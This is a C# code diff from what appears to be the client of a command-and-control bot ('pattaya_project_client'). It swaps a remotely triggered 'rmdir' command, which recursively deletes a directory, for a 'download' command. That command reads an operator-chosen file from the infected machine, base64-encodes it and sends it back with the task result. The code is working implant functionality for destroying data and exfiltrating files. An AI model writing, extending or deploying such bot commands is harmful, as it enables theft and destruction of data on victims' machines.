@@ -1,19 +1,18 @@
 ﻿using pattaya_project_client.Commands.Interfaces;
 using pattaya_project_client.Models;
+using System;
 using System.IO;
-
 
 namespace pattaya_project_client.Commands.Implements
 {
-    public class DeleteDirectory : BotCommand
+    public class DownloadFile : BotCommand
     {
-        public override string TaskName => "rmdir";
+        public override string TaskName => "download";
 
         public override BotTaskResult RunTask(BotTask task)
         {
             var arguments = task.Arguments.Split(' ');
-
-            if (arguments is null || arguments.Length == 0)
+            if (arguments is null || arguments.Length == 0 || arguments[0] == "")
             {
                 
                 return new BotTaskResult
@@ -23,24 +22,34 @@ namespace pattaya_project_client.Commands.Implements
                 };
             }
 
-            var path = arguments[0];
-            Directory.Delete(path, true);
+            var targetFile = arguments[0];
 
-            if (!Directory.Exists(path))
+            string currentDir = Directory.GetCurrentDirectory();
+
+            // Join paths
+            string fullPath = Path.Combine(currentDir, targetFile);
+
+            if (!File.Exists(fullPath))
             {
+                
+
                 return new BotTaskResult
                 {
                     TaskId = task.TaskId,
-                    Result = $"{path} deleted"
+                    Result = $"{targetFile} not found"
                 };
             }
 
+            byte[] fileBytes = File.ReadAllBytes(fullPath);
 
-            
+            string base64String = Convert.ToBase64String(fileBytes);
+
             return new BotTaskResult
             {
                 TaskId = task.TaskId,
-                Result = $"Failed to delete {path}"
+                Result = $"Downloading...",
+                RespondingFile = base64String,
+                RespondingFilename = targetFile
             };
         }
     }
